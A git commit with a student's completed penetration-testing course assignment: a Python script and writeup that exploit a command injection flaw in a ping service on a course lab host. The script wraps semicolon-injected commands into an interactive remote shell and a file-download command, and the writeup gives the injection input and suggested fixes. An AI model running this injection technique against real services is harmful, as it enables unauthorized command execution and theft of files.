b7f1afe91fe3b577607694d2a9494468707752d4
Lauren Kosub <laurenkosub@gmail.com>
2018-09-25 14:08:40 -0400

    Completed Week 4 Assignment

--- week/4/stub.py
+++ week/4/stub.py
@@ -6,32 +6,63 @@
 
     from the OSINT HW to complete this assignment. Good luck!
 """
-
+import time
 import socket
+import sys
 
 host = "cornerstoneairlines.co" # IP address here
 port = 45 # Port here
 
 def execute_cmd(cmd):
-    """
-        Sockets: https://docs.python.org/2/library/socket.html
-        How to use the socket s:
+    help_menu = '''----------HELP MENU----------\n 1. shell --> Drop into an interactive shell and allow users to gracefully exit\n 2. pull <remote-path> <local-path> --> Download files\n 3. help --> shows this help menu\n 4. quit --> Quit the shell\n'''
+    pwd = "/"
+    
+    split_cmd = cmd.split(" ")
+    cmd = split_cmd[0]
+    if cmd == "shell":
+        print (pwd + "> "),
+        inputt = raw_input()
 
-            # Establish socket connection
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, port))
+        while inputt != "quit":
+            # return to last working directory
+            last_pwd = "; cd " + pwd + " && " 
+            data = ""
 
-            Reading:
+            if "cd " in inputt:
+                out = last_pwd + inputt + " && echo $PWD\n"
+                pwd = send_cmd(out)
+            else:
+                out = last_pwd + inputt + '\n'
+                data = send_cmd(out)
+            
+            print data # cmd output
+            print (pwd + "> "),
+            inputt = raw_input()
+    if cmd == "pull":
+        data = send_cmd(";cat " + split_cmd[1] + '\n')
+        f = open(split_cmd[2], "w+")
+        f.write(data)
+        f.close()
+    if cmd == "help":
+        print (help_menu)
+    else:
+        print("Invalid input. Use the help menu to see valid inputs.\n")
 
-                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-                print(data)             # Prints data
-
-            Sending:
-
-                s.send("something to send\n")   # Send a newline \n at the end of your command
-    """
-    print("IMPLEMENT ME")
-
+def send_cmd(cmd):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host,port))
+    data = b''
+   
+    # receive all banner info first
+    while "Enter IP address:" not in data.decode('ascii'):
+        data += s.recv(1024)
+    
+    s.send(cmd.encode('utf-8'))
+    data = s.recv(1024) # cmd output
+    return data.decode('ascii').strip()
 
 if __name__ == '__main__':
-    print("IMPLEMENT ME")
+    #execute_cmd("shell")
+    #execute_cmd("pull /home/flag.txt /myflag.txt") 
+    #execute_cmd("help")
+    #execute_cmd("lauren")
--- week/4/writeup/README.md
+++ week/4/writeup/README.md
@@ -1,17 +1,30 @@
 Writeup 3 - Pentesting I
 ======
 
-Name: *PUT YOUR NAME HERE*
-Section: *PUT YOUR SECTION HERE*
+Name: Lauren Kosub
+Section: 0102
 
 I pledge on my honor that I havie not given or received any unauthorized assistance on this assignment or examination.
 
-Digital acknowledgement of honor pledge: *PUT YOUR NAME HERE*
+Digital acknowledgement of honor pledge: Lauren Kosub
 
 ## Assignment 4 Writeup
 
 ### Part 1 (45 pts)
-*Put your writeup >= 300 words here in response to the part 1 prompt*
+flag = CMSC389R-{p1ng_as_a_$erv1c3}
+input = ; cat /home/flag.txt
+
+thought process = Fred's new solution is utilizing the command line, so I figured that I would be able to
+terminate his command he was executing (ping) with a semi colon, then append whatever commands I wanted
+after the semicolon, and those commands would execute in his system (instead of ping because ping was
+terminated by the semicolon).
+
+After looking at the Fred's script (/opt/container_startup.sh), I think that to prevent this vulnerability fred
+could limit the input to one word (instead of just any string of input) or more precisely one ip-like string
+(no spaces, nothing besides numbers and periods). Fred could also just have a check in his script to see if the input was proper ping input. You shouldn't just arbitarily execute it.
+
+Another way you can protect against malicious users is ensure that the input does not contain any semi-colons, back ticks, or other characters that serve the same function (to end a previous command or insert code into it). You can use black listing or you could escape bad character.
 
 ### Part 2 (55 pts)
-*Put your writeup >= 200 words here in response to part 2 prompt. Your code for part 2 should be copied into a file in the /writeup directory and pushed there as well*
+see my stub.py for the interactive shell
+
